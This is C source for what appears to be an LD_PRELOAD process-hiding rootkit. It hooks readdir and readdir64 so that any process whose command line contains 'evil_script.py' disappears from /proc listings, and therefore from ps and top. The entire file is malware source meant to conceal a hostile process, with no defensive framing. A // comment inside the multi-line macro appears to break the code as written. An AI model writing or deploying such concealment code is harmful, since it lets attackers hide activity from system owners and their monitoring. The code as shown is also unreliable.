#define _GNU_SOURCE
#include <dirent.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <dlfcn.h>

/*
 * Each process with this name will be excluded
 */
static const char *to_filter_process = "evil_script.py";

/*
 * Get the directory name given a DIR* handle
 */
static int get_dir_name(DIR* dir, char * buf, size_t size)
{
	int fd = dirfd(dir);
	if (fd == -1)
	{
		return 0;
	}

	char tmp[64];
	snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);

	ssize_t ret = readlink(tmp, buf, size);

	if(ret == -1)
	{
    return 0;
  }

  buf[ret] = 0;
  return 1;
}

/*
 * Get  process cmdline given its pid
 */
static int get_process_cmdline(char *pid, char *buf)
{
	// check if pid is number.
	if(strspn(pid, "0123456789") != strlen(pid))
	{
		return 0;
	}

	char tmp[256] = "";
	snprintf(tmp, sizeof(tmp), "/proc/%s/cmdline", pid);

	char buffer[4096];

	int fd ;
	if((fd = open(tmp, O_RDONLY)) == -1 )
	{
		// error: cannot read the cmd
		return 0;
	}

	// read cmdline into buf
	int nbytesread = read(fd, buffer, 4096);
	char *end = buffer + nbytesread;

	for (char *p = buffer; p < end;)
	{
		strncat(buf, p, strlen(p));
		strcat(buf, " ");
		while(*p++); // skip NULL until start of the next string.
	}

	close(fd);
	return 1;
}

/*
 * Define the hooked function:  readdir and readdir64
 */
#define DECLARE_READDIR(dirent, readdir)                                        \
static struct dirent* (*original_##readdir)(DIR*) = NULL;                       \
                                                                                \
struct dirent* readdir(DIR *dirp)                                               \
{                                                                               \
    if(original_##readdir == NULL) {                                            \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);                        \
        if(original_##readdir == NULL)                                          \
        {                                                                       \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());                 \
        }                                                                       \
    }                                                                           \
                                                                                \
    struct dirent* dir;                                                         \
    // keep reading the dir                                                     \
    while(1)                                                                    \
    {                                                                           \
        dir = original_##readdir(dirp);                                         \
        if(dir) {                                                               \
            char dir_name[256];                                                 \
            char process_cmdline[4096] = "";                                    \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&                \
                strcmp(dir_name, "/proc") == 0 &&                               \
                get_process_cmdline(dir->d_name, process_cmdline) &&            \
                strstr(process_cmdline, to_filter_process) != NULL ) {          \
                continue;                                                       \
            }                                                                   \
        }                                                                       \
        break;                                                                  \
    }                                                                           \
    return dir;                                                                 \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);

